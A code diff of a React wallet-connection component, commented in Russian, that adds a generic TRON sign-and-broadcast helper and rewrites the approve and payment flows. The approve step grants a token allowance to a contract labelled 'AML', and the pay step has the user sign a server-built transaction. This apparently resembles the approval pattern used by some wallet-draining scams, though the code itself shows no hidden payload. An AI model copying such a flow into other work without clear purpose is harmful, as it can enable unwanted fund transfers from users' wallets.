@@ -64,6 +64,92 @@ const verifyManualPayment = async (txid, expectedRecipient, expectedAmount, chai
   return true;
 };
 
+// ─── Универсальная отправка TRON транзакции (использует window.tronWeb.trx.sign) ───
+// ─── Улучшенная отправка TRON транзакции (для approve и pay) ────────────────
+const sendTronTransaction = async (txBuilderFn) => {
+  // 1. Получаем tronWeb из доступных источников
+  const tronWeb = window.trustwallet?.tronLink?.tronWeb || window.tronLink?.tronWeb || window.tronWeb;
+  
+  if (!tronWeb || !tronWeb.ready) {
+    throw new Error('TronWeb не инициализирован. Установите TronLink или откройте сайт во встроенном браузере TrustWallet.');
+  }
+
+  // 2. Проверяем, что кошелёк подключён и разблокирован
+  const fromAddress = tronWeb.defaultAddress?.base58;
+  if (!fromAddress) {
+    throw new Error('Кошелёк не подключён или заблокирован.');
+  }
+
+  // 3. Строим транзакцию (например, approve или transfer)
+  let unsignedTx;
+  try {
+    unsignedTx = await txBuilderFn(tronWeb, fromAddress);
+  } catch (err) {
+    throw new Error(`Ошибка при построении транзакции: ${err.message}`);
+  }
+
+  if (!unsignedTx || !unsignedTx.txID) {
+    throw new Error('Не удалось создать транзакцию.');
+  }
+
+  console.log('Unsigned transaction created:', unsignedTx);
+
+  // 4. Запрашиваем подпись (вызовет всплывающее окно кошелька)
+  let signedTx;
+  try {
+    signedTx = await tronWeb.trx.sign(unsignedTx);
+  } catch (err) {
+    if (err?.message?.includes('Confirmation declined by user')) {
+      throw new Error('Вы отклонили транзакцию.');
+    }
+    throw new Error(`Ошибка при подписи: ${err.message}`);
+  }
+
+  if (!signedTx) {
+    throw new Error('Транзакция не была подписана.');
+  }
+
+  console.log('Signed transaction:', signedTx);
+
+  // 5. Определяем txID и при необходимости транслируем транзакцию
+  let transactionId;
+
+  if (typeof signedTx === 'string') {
+    // Кошелёк вернул txid — транзакция уже отправлена
+    transactionId = signedTx;
+    console.log('Transaction already broadcasted, txid:', transactionId);
+  } else if (signedTx?.txID) {
+    transactionId = signedTx.txID;
+
+    // Проверяем наличие подписи — если есть, транслируем вручную
+    if (signedTx.signature) {
+      try {
+        const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTx);
+        // Проверяем успешность broadcast
+        if (!broadcastResult.result) {
+          // Игнорируем дубликат транзакции — она уже в сети
+          if (broadcastResult.code === 'DUP_TRANSACTION_ERROR') {
+            console.warn('Транзакция уже была отправлена ранее (дубликат).');
+          } else {
+            throw new Error(`Ошибка broadcast: ${broadcastResult.message || broadcastResult.code}`);
+          }
+        }
+        console.log('Broadcast result:', broadcastResult);
+      } catch (err) {
+        // Если ошибка не дубликат, пробрасываем
+        if (!err.message?.includes('DUP_TRANSACTION_ERROR')) {
+          throw err;
+        }
+      }
+    }
+  } else {
+    throw new Error(`Неожиданный формат ответа от sign(): ${JSON.stringify(signedTx)}`);
+  }
+
+  console.log('✅ Transaction successful, txid:', transactionId);
+  return transactionId;
+};
+
 // ══════════════════════════════════════════════════════════════════════════════
 // КОМПОНЕНТ
 // ══════════════════════════════════════════════════════════════════════════════
@@ -83,7 +169,7 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   const isBusy = connecting || approving || paying || manualChecking;
 
   // Определяем доступные провайдеры
-  const hasTronWeb = typeof window !== 'undefined' && window.tronWeb?.ready;
+  const hasTronWeb = typeof window !== 'undefined' && (window.tronWeb?.ready || window.tronLink?.tronWeb);
   const hasEthereum = typeof window !== 'undefined' && window.ethereum;
 
   // Если нет tronWeb и нет ethereum, переключаем в ручной режим
@@ -93,13 +179,14 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
     }
   }, []);
 
-  // ─── Подключение к TronLink ─────────────────────────────────────────────────
+  // ─── Подключение к TronLink / TrustWallet (TRON) ────────────────────────────
   const connectTron = async () => {
-    if (!window.tronWeb) throw new Error('TronLink не обнаружен');
-    if (!window.tronWeb.defaultAddress?.base58) {
-      await window.tronWeb.request({ method: 'tron_requestAccounts' });
+    const tronWeb = window.tronWeb || window.trustwallet?.tronLink?.tronWeb || window.tronLink?.tronWeb;
+    if (!tronWeb) throw new Error('TronLink не обнаружен');
+    if (!tronWeb.defaultAddress?.base58) {
+      await tronWeb.request({ method: 'tron_requestAccounts' });
     }
-    let tw = window.tronWeb;
+    let tw = tronWeb;
     let attempts = 0;
     while (!tw?.ready && attempts < 20) {
       await new Promise(r => setTimeout(r, 200));
@@ -126,10 +213,11 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   };
 
   const approveTron = async () => {
-    setApproving(true);
-    const tid = toast.loading('Подпишите approve в TronLink…');
-    try {
-      const ownerHex = '41' + _encodeAddress(address);
+  setApproving(true);
+  const tid = toast.loading('Подпишите approve в кошельке…');
+  try {
+    await sendTronTransaction(async (tronWeb, fromAddress) => {
+      const ownerHex = '41' + _encodeAddress(fromAddress);
       const spenderHex = _encodeAddress(TRON_AML_CONTRACT).padStart(64, '0');
       const amountHex = TRON_PAYMENT_AMOUNT.toString(16).padStart(64, '0');
       const res = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
@@ -146,35 +234,37 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
         }),
       });
       const data = await res.json();
-      const approveTx = data.transaction;
-      const signed = await web3Provider.trx.sign(approveTx);
-      const txid = await broadcastTx(signed, 'tron');
-      toast.dismiss(tid);
-      toast.success('Approve подтверждён!');
-      setHasAllowance(true);
-    } catch (err) {
-      toast.dismiss(tid);
-      toast.error('Ошибка approve: ' + err.message);
-    } finally {
-      setApproving(false);
-    }
+      return data.transaction;
+    });
+    toast.dismiss(tid);
+    toast.success('Approve подтверждён!');
+    setHasAllowance(true);
+  } catch (err) {
+    toast.dismiss(tid);
+    toast.error('Ошибка approve: ' + err.message);
+  } finally {
+    setApproving(false);
+  }
   };
 
   const payTron = async () => {
     setPaying(true);
     const tid = toast.loading('Оплата через контракт…');
     try {
-      const res = await fetch('/api/pay', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userAddress: address, chain: 'tron' }),
+      const txid = await sendTronTransaction(async (tronWeb) => {
+        const res = await fetch('/api/pay', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userAddress: address, chain: 'tron' }),
+        });
+        const data = await res.json();
+        if (!data?.transaction) throw new Error(data.error || 'Ошибка сервера');
+        return data.transaction;
       });
-      const data = await res.json();
-      if (!res.ok) throw new Error(data.error);
-      setTxHash(data.txid);
+      setTxHash(txid);
       toast.dismiss(tid);
-      toast.success(`Оплата прошла! TX: ${data.txid.slice(0, 14)}…`);
-      onPaymentSuccess?.(data.txid, address);
+      toast.success(`Оплата прошла! TX: ${txid.slice(0, 14)}…`);
+      onPaymentSuccess?.(txid, address);
     } catch (err) {
       toast.dismiss(tid);
       toast.error('Ошибка оплаты: ' + err.message);
@@ -357,7 +447,18 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   );
 }
 
-// ─── Вспомогательные стили ────────────────────────────────────────────────────
+// ─── Вспомогательные функции и стили ──────────────────────────────────────────
+function _encodeAddress(base58Addr) {
+  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  let n = BigInt(0);
+  for (const ch of base58Addr) {
+    const i = AB.indexOf(ch);
+    if (i < 0) throw new Error('bad base58');
+    n = n * BigInt(58) + BigInt(i);
+  }
+  return n.toString(16).padStart(50, '0').slice(2, 42);
+}
+
 function Spinner({ size = 16 }) {
   return <span style={{ display: 'inline-block', width: size, height: size, border: '2px solid rgba(255,255,255,0.3)', borderTopColor: '#fff', borderRadius: '50%', animation: 'spin 0.7s linear infinite', flexShrink: 0 }} />;
 }
